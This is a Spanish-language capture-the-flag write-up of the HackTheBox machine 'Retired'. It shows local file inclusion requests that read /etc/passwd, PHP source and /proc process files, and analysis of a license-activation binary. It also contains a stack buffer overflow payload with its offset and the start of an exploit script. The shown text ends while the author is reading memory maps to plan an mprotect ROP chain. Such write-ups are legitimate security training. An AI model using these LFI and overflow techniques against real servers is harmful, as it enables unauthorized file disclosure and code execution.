<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackTheBox Retired</title>

  <meta name="description" content="Resolución de la máquina Retired de la plataforma de HackTheBox">
  <meta name="author" content="DarthBear">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackTheBox Retired">
  <meta name="twitter:description" content="Resolución de la máquina Retired de la plataforma de HackTheBox">
  <meta name="twitter:creator" content="DarthBear">  
  <meta name="twitter:image" content="/images/hackthebox/retired.png" />

  <meta property="og:site_name" content="DarthBear" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackTheBox Retired">
  <meta property="og:description" content="Resolución de la máquina Retired de la plataforma de HackTheBox">
  <meta property="og:image" content="/images/hackthebox/retired.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/retired.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Retired" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="DarthBear">
          <h1 class="panel-cover__title panel-title scale-up-center">DarthBear</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/hackthebox" title="DarthBear" class="blog-button">HackTheBox</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/kevincillo32" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://x.com/Bear00652327128" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/kevinch1106" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://www.youtube.com/@darthbear3654" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:kevincillo32@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#shell-www-data">Shell - www-data</a></li>
        <li><a href="#bof-mprotect">BOF - mprotect</a></li>
        <li><a href="#bof-writable">BOF - writable</a></li>
        <li><a href="#shell-dev">Shell - dev</a></li>
        <li><a href="#shell-root">Shell - root</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackTheBox</h4>
    <picture><img src="/images/hackthebox/retired.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Retired</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.11.154
Nmap scan report for 10.10.11.154  
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</span>
</code></pre></div></div><br>

<p class="plain-text">Al visitar la pagina principal podemos ver que el archivo es gestionado mediante el parametro <code class="language-plaintext highlighter-rouge">page</code> en la petición <code class="language-plaintext highlighter-rouge">GET</code> el cual por defecto apunta a <code class="language-plaintext highlighter-rouge">default.html</code></p>
<a href="/hackthebox/retired/1.png" target="_blank"><div><p><img src="/hackthebox/retired/1.png"></p></div></a>

<p class="plain-text">Podemos probar un <code class="language-plaintext highlighter-rouge">Local File Inclusion</code> para apuntar a archivos locales de la máquina, en este caso logramos leer directamente el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=/etc/passwd"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">sh$  
root:x:0:0:root:/root:/bin/ba</span><span class="ro">sh</span><span class="p">
vagrant:x:1000:1000::/vagrant:/bin/ba</span><span class="ro">sh</span><span class="p">
dev:x:1001:1001::/home/dev:/bin/ba</span><span class="ro">sh</span>
</code></pre></div></div><br>

<p class="plain-text">Si revisamos el archivo <code class="language-plaintext highlighter-rouge">index.php</code> nos encontramos con que deberia haber una <code class="language-plaintext highlighter-rouge">sanitización</code> para el LFI sin embargo desde <code class="language-plaintext highlighter-rouge">curl</code> aunque tenemos un <code class="language-plaintext highlighter-rouge">302</code> nos detenemos justo antes de la redireccion a <code class="language-plaintext highlighter-rouge">default.html</code> y podemos ver el contenido</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=index.php"</span><span class="p">
&lt?php
</span><span class="o">function </span><span class="no">sanitize_input</span><span class="p">($</span><span class="am">param</span><span class="p">) {
    $param1 </span><span class="o">= </span><span class="no">str_replace</span><span class="p">(</span><span class="s">"../"</span><span class="p">,</span><span class="s">""</span><span class="p">,$param);
    $param2 </span><span class="o">= </span><span class="no">str_replace</span><span class="p">(</span><span class="s">"./"</span><span class="p">,</span><span class="s">""</span><span class="p">,$param1);
    </span><span class="o">return </span><span class="p">$param2;
}

$page </span><span class="o">= </span><span class="p">$_GET[</span><span class="s">'page'</span><span class="p">];
</span><span class="o">if</span><span class="p"> (</span><span class="o">isset</span><span class="p">($page) </span><span class="o">&& </span><span class="no">preg_match</span><span class="p">(</span><span class="s">"/</span><span class="o">^</span><span class="mi">[a-z]</span><span class="s">/"</span><span class="p">, $page)) {
    $page </span><span class="o">= </span><span class="p">sanitize_input($page);
} </span><span class="o">else</span><span class="p"> {
    </span><span class="no">header</span><span class="p">(</span><span class="s">'Location: /index.php?page=default.html'</span><span class="p">);  
}

</span><span class="no">readfile</span><span class="p">($page);
?></span>
</code></pre></div></div><br>

<p class="plain-text">Por ahora buscaremos mas archivos con extensión <code class="language-plaintext highlighter-rouge">.html</code>, esto podemos bruteforcear usando <code class="language-plaintext highlighter-rouge">wfuzz</code> y un diccionario de rutas, nos encontramos con <code class="language-plaintext highlighter-rouge">beta</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.154/FUZZ.html -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.154/FUZZ.html
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000232:   </span><span class="ve">200</span><span class="p">        72 L     304 W      4144 Ch     "beta"
000000822:   </span><span class="ve">200</span><span class="p">        188 L    824 W      11414 Ch    "default"</span>
</code></pre></div></div><br>

<p class="plain-text">En la página <code class="language-plaintext highlighter-rouge">beta.html</code> nos encontramos con un campo de subida de archivos, donde nos pide que subamos un archivo de <code class="language-plaintext highlighter-rouge">licencia</code> con un tamaño de <code class="language-plaintext highlighter-rouge">512</code> bytes</p>
<a href="/hackthebox/retired/2.png" target="_blank"><div><p><img src="/hackthebox/retired/2.png"></p></div></a>

<p class="plain-text">Subimos un archivo <code class="language-plaintext highlighter-rouge">test</code> y al interceptar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> vemos que la hace a <code class="language-plaintext highlighter-rouge">activate_license.php</code> enviando el contenido del archivo como <code class="language-plaintext highlighter-rouge">licensefile</code></p>
<a href="/hackthebox/retired/3.png" target="_blank"><div><p><img src="/hackthebox/retired/3.png"></p></div></a>

<p class="plain-text">Si miramos lo que hace el php toma el contenido del archivo <code class="language-plaintext highlighter-rouge">licensefile</code> que recibe en la petición y lo reenvia a el puerto <code class="language-plaintext highlighter-rouge">1337</code> de la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> mediante un socket</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=activate_license.php"</span><span class="p">
&lt?php
</span><span class="o">if</span><span class="p">(</span><span class="o">isset</span><span class="p">($_FILES[</span><span class="s">'licensefile'</span><span class="p">])) {
    $license      </span><span class="o">= </span><span class="no">file_get_contents</span><span class="p">($_FILES[</span><span class="s">'licensefile'</span><span class="p">][</span><span class="s">'tmp_name'</span><span class="p">]);
    $license_size </span><span class="o">= </span><span class="p">$_FILES[</span><span class="s">'licensefile'</span><span class="p">][</span><span class="s">'size'</span><span class="p">];

    $socket </span><span class="o">= </span><span class="no">socket_create</span><span class="p">(</span><span class="mi">AF_INET</span><span class="p">, </span><span class="mi">SOCK_STREAM</span><span class="p">, </span><span class="mi">SOL_TCP</span><span class="p">);
    </span><span class="o">if </span><span class="p">(</span><span class="o">!</span><span class="p">$socket) { </span><span class="o">echo </span><span class="s">"error socket_create()</span><span class="mi">\n</span><span class="s">"</span><span class="p">; }

    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">socket_connect</span><span class="p">($socket, </span><span class="s">'127.0.0.1'</span><span class="p">, </span><span class="mi">1337</span><span class="p">)) {
        </span><span class="o">echo </span><span class="s">"error socket_connect()" </span><span class="o">. </span><span class="no">socket_strerror</span><span class="p">(</span><span class="no">socket_last_error</span><span class="p">()) </span><span class="o">.</span><span class="s"> "</span><span class="mi">\n</span><span class="s">"</span><span class="p">;  
    }

    </span><span class="no">socket_write</span><span class="p">($socket, </span><span class="no">pack</span><span class="p">(</span><span class="s">"N"</span><span class="p">, $license_size));
    </span><span class="no">socket_write</span><span class="p">($socket, $license);

    </span><span class="no">socket_shutdown</span><span class="p">($socket);
    </span><span class="no">socket_close</span><span class="p">($socket);
}
?></span>
</code></pre></div></div><br>

<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">/proc/sched_debug</code> encontramos información sobre los <code class="language-plaintext highlighter-rouge">procesos</code> corriendo, si grepeamos por <code class="language-plaintext highlighter-rouge">activate</code> encontramos uno correspondiente al pid <code class="language-plaintext highlighter-rouge">400</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=/proc/sched_debug"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">activate
 S </span><span class="ro">activate</span><span class="p">_licens   400     15754.825063        23   120         0.000000         5.085409         0.000000 0 0 /  </span>
</code></pre></div></div><br>

<p class="plain-text">Si descargamos el archivo <code class="language-plaintext highlighter-rouge">cmdline</code> del proceso que corresponde al pid <code class="language-plaintext highlighter-rouge">400</code> podemos ver el comando con el que se <code class="language-plaintext highlighter-rouge">ejecuto</code> el archivo que creo el proceso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://10.10.11.154/?page=/proc/400/cmdline"</span><span class="p"> -o cmdline  

</span><span class="ve">❯ cat </span><span class="p">cmdline
/usr/bin/activate_license1337</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">xxd</code> el cmdline nos encontramos que entre <code class="language-plaintext highlighter-rouge">activate_license</code> y <code class="language-plaintext highlighter-rouge">1337</code> hay un <code class="language-plaintext highlighter-rouge">.</code> que es igual a un espacio lo que significa que 1337 es un <code class="language-plaintext highlighter-rouge">argumento</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ xxd </span><span class="p">cmdline
00000000: 2f75 7372 2f62 696e 2f61 6374 6976 6174  /usr/bin/activat  
00000010: 655f 6c69 6365 6e73 6500 3133 3337 00    e_license.1337.</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-www-data">
<br><h3 class="post-title">Shell - www-data</h3><br>

<p class="plain-text">Para ver en que consiste el programa que se ejecuta en el puerto <code class="language-plaintext highlighter-rouge">1337</code> descargamos con curl el archivo <code class="language-plaintext highlighter-rouge">activate_license</code> para poder analizarlo en local mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=/usr/bin/activate_license"</span><span class="p"> -o activate_license  </span>
</code></pre></div></div><br>

<p class="plain-text">Otorgamos permisos de ejecución a este y al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">argumento</code>, como en el cmdline le pasaremos el <code class="language-plaintext highlighter-rouge">1337</code>, al hacerlo empieza un <code class="language-plaintext highlighter-rouge">listener</code> en este</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ chmod </span><span class="p">+x activate_license

</span><span class="ve">❯ ./activate_license</span><span class="p">
Error: specify port to bind to

</span><span class="ve">❯ ./activate_license </span><span class="p">1337
[+] starting server listening on port 1337  
[+] listening ...</span>
</code></pre></div></div><br>

<p class="plain-text">Para analizar mejor podemos abrirlo en <code class="language-plaintext highlighter-rouge">ida</code>, la función main inicia comprobando que se reciba un argumento que en este caso sera el puerto donde se pondrá en escucha</p>
<a href="/hackthebox/retired/4.png" target="_blank"><div><p><img src="/hackthebox/retired/4.png"></p></div></a>

<p class="plain-text">Una vez se recibe un puerto se pasa a <code class="language-plaintext highlighter-rouge">htons</code> para darle el formato adecuado, posteriormente se utiliza la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un nuevo socket y luego se llama a <code class="language-plaintext highlighter-rouge">bind</code> simplemente para asociar el socket a la direccion local</p>
<a href="/hackthebox/retired/5.png" target="_blank"><div><p><img src="/hackthebox/retired/5.png"></p></div></a>

<p class="plain-text">Ahora llama a <code class="language-plaintext highlighter-rouge">listen</code> para que ese socket espere una conexion entrante, después con <code class="language-plaintext highlighter-rouge">puts</code> se muestra un mensaje para mostrar que esta en escucha, luego se llama a <code class="language-plaintext highlighter-rouge">accept</code> que deberia aceptar una conexion entrante cualquiera de un cliente</p>
<a href="/hackthebox/retired/6.png" target="_blank"><div><p><img src="/hackthebox/retired/6.png"></p></div></a>

<p class="plain-text">Luego de aceptar la conexión se guarda el nuevo descriptor que pertenece al cliente y le pasa ese socket recibido como argumento a la función <code class="language-plaintext highlighter-rouge">activate_license</code></p>
<a href="/hackthebox/retired/7.png" target="_blank"><div><p><img src="/hackthebox/retired/7.png"></p></div></a>

<p class="plain-text">El primer bloque de la función <code class="language-plaintext highlighter-rouge">activate_license</code> utiliza la función <code class="language-plaintext highlighter-rouge">read</code> para leer el tamaño del buffer que se recibió, que es el archivo que se envia desde la web</p>
<a href="/hackthebox/retired/9.png" target="_blank"><div><p><img src="/hackthebox/retired/9.png"></p></div></a>

<p class="plain-text">Luego de ello se lee el buffer o contenido del archivo, sin embargo este se guarda en un buffer en <code class="language-plaintext highlighter-rouge">rbp - 512</code> por lo que si el tamaño del archivo excede ese limite sobrescribira otros datos ocasionando una vulnerabilidad de <code class="language-plaintext highlighter-rouge">buffer overflow</code></p>
<a href="/hackthebox/retired/10.png" target="_blank"><div><p><img src="/hackthebox/retired/10.png"></p></div></a>

<p class="plain-text">Antes de explotarlo es necesario revisas las <code class="language-plaintext highlighter-rouge">protecciones</code> del binario con <code class="language-plaintext highlighter-rouge">checksec</code>, casi todas estan habilitadas, entre ellas <code class="language-plaintext highlighter-rouge">NX</code> que impide la ejecución en la pila y <code class="language-plaintext highlighter-rouge">PIE</code> que hace aleatoria la dirección base del binario por lo que el <code class="language-plaintext highlighter-rouge">rop</code> se complica</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ checksec </span><span class="p">activate_license
[</span><span class="az">*</span><span class="p">] '/home/user/activate_license'  
    Arch:     amd64-64-little
    RELRO:    </span><span class="ve">Full RELRO</span><span class="p">
    Stack:    </span><span class="ro">No canary found</span><span class="p">
    NX:       </span><span class="ve">NX enabled</span><span class="p">
    PIE:      </span><span class="ve">PIE enabled</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos usando <code class="language-plaintext highlighter-rouge">php</code> en el directorio donde esta <code class="language-plaintext highlighter-rouge">activate_license.php</code> para asi poder redirigir el <code class="language-plaintext highlighter-rouge">licensefile</code> a la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> por el puerto <code class="language-plaintext highlighter-rouge">1337</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo php </span><span class="p">-S 0.0.0.0:80
PHP 8.2.5 Development Server (http://0.0.0.0:80) started  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con gdb usando el argumento <code class="language-plaintext highlighter-rouge">1337</code> correremos el programa en ese puerto</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ gdb</span><span class="p"> -q --args activate_license 1337
Reading symbols from </span><span class="ve">activate_license</span><span class="p">...
</span><span class="ro">pwndbg> </span><span class="p">run
Starting program: </span><span class="ve">/home/user/activate_license </span><span class="p">1337
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
[+] starting server listening on port 1337
[+] listening ...</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">python</code> para enviar nuestro payload como archivo <code class="language-plaintext highlighter-rouge">licensefile</code> al <code class="language-plaintext highlighter-rouge">activate_license.php</code>, nuestro payload consiste en <code class="language-plaintext highlighter-rouge">512 A's</code> que llenaran el buffer, <code class="language-plaintext highlighter-rouge">8 B's</code> que tomaran el valor de <code class="language-plaintext highlighter-rouge">rbp</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que sobrescribirán la dirección de retorno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3</span><span class="p"> -q
>>> from pwn import cyclic
>>> import requests
>>> payload = b"A" * 512 + b"B" * 8 + b"C" * 8
>>> requests.post("http://localhost/activate_license.php", files={"licensefile": payload})  
&ltResponse [200]>
>>></span>
</code></pre></div></div><br>

<p class="plain-text">Al hacer esto solo un <code class="language-plaintext highlighter-rouge">hilo</code> del programa que esta corriendo en gdb se corrompe, solo nos queda comprobar el payload, <code class="language-plaintext highlighter-rouge">rbp</code> tomo el valor de las <code class="language-plaintext highlighter-rouge">B's</code> y la direccion de retorno las <code class="language-plaintext highlighter-rouge">C's</code>, comprobamos que el offset es de <code class="language-plaintext highlighter-rouge">520</code> bytes para el retorno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">run
Starting program: </span><span class="ve">/home/user/activate_license </span><span class="p">1337
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
[+] starting server listening on port 1337
[+] listening ...
[+] accepted client connection from 0.0.0.0:0
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
[+] reading 528 bytes
[+] activated license: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
</span><span class="az">0x00005555555555c0 </span><span class="p">in </span><span class="am">activate_license</span><span class="p"> (</span><span class="az">sockfd</span><span class="p">=4) at </span><span class="ve">activate_license.c</span><span class="p">:64
64	activate_license.c: No existe el fichero o el directorio.
</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
$1 = 0x4242424242424242
</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
</span><span class="az">0x7fffffffe298</span><span class="p">:	0x4343434343434343
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos un pequeño <code class="language-plaintext highlighter-rouge">script</code> en python importando algunas librerias que utilizaremos y definiendo el <code class="language-plaintext highlighter-rouge">offset</code>, ademas el <code class="language-plaintext highlighter-rouge">junk</code> que son <code class="language-plaintext highlighter-rouge">A's</code> por el offset</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">p64
</span><span class="o">import </span><span class="p">requests</span>

</span><span class="p">offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset</span>
</code></pre></div></div><br>

<p class="plain-text">Logramos tomar el control de la siguiente dirección a ejecutar sin embargo tenemos varias limitaciones, la mas importante es que no tenemos conexion directa con el programa por lo que no podriamos enviar una cadena <code class="language-plaintext highlighter-rouge">rop</code> para hacer un leak de <code class="language-plaintext highlighter-rouge">libc</code> y volver a <code class="language-plaintext highlighter-rouge">main</code> como en la máquina <a href="/hackthebox/safe#bof-puts">safe</a>, y si la tuvieramos tampoco seria posible ya que tenemos el <code class="language-plaintext highlighter-rouge">PIE</code> que cambia la dirección base en cada ejecución</p>

</section>

<section class="post" id="bof-mprotect">
<br><h3 class="post-title">Buffer Overflow - mprotect</h3><br>

<p class="plain-text">Aunque no tenemos un leak de <code class="language-plaintext highlighter-rouge">libc</code> tampoco lo necesitamos ya que el exploit se ejecutá en un hilo por lo que las direcciones base no cambian y al tener un <code class="language-plaintext highlighter-rouge">LFI</code> podemos leer el archivo <code class="language-plaintext highlighter-rouge">maps</code> del pid del proceso que contiene las direcciones base tando del binario como de las librerias y segmentos como lo es el stack</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://10.10.11.154/?page=/proc/400/maps"</span><span class="p">
55d3cd575000-55d3cd576000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
55d3cd576000-55d3cd577000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
55d3cd577000-55d3cd578000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55d3cd578000-55d3cd579000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55d3cd579000-55d3cd57a000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55d3ce68f000-55d3ce6b0000 rw-p 00000000 00:00 0                          [heap]
7f670e11a000-7f670e11c000 rw-p 00000000 00:00 0 
7f670e11c000-7f670e11d000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f670e11d000-7f670e11f000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f670e11f000-7f670e120000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f670e120000-7f670e121000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f670e121000-7f670e122000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f670e122000-7f670e129000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f670e129000-7f670e139000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f670e139000-7f670e13e000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f670e13e000-7f670e13f000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f670e13f000-7f670e140000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f670e140000-7f670e144000 rw-p 00000000 00:00 0 
7f670e144000-7f670e153000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f670e153000-7f670e1ed000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f670e1ed000-7f670e286000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f670e286000-7f670e287000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f670e287000-7f670e288000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f670e288000-7f670e2ad000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f670e2ad000-7f670e3f8000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f670e3f8000-7f670e442000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f670e442000-7f670e443000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f670e443000-7f670e446000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f670e446000-7f670e449000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f670e449000-7f670e44d000 rw-p 00000000 00:00 0 
7f670e44d000-7f670e45d000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f670e45d000-7f670e555000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f670e555000-7f670e589000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f670e589000-7f670e58d000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f670e58d000-7f670e590000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f670e590000-7f670e592000 rw-p 00000000 00:00 0 
7f670e597000-7f670e598000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f670e598000-7f670e5b8000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f670e5b8000-7f670e5c0000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f670e5c1000-7f670e5c2000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f670e5c2000-7f670e5c3000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f670e5c3000-7f670e5c4000 rw-p 00000000 00:00 0 
7ffe3ea7d000-7ffe3ea9e000 rw-p 00000000 00:00 0                          [stack]
7ffe3eb6f000-7ffe3eb73000 r--p 00000000 00:00 0                          [vvar]
7ffe3eb73000-7ffe3eb75000 r-xp 00000000 00:00 0                          [vdso]</span>
</code></pre></div></div><br>

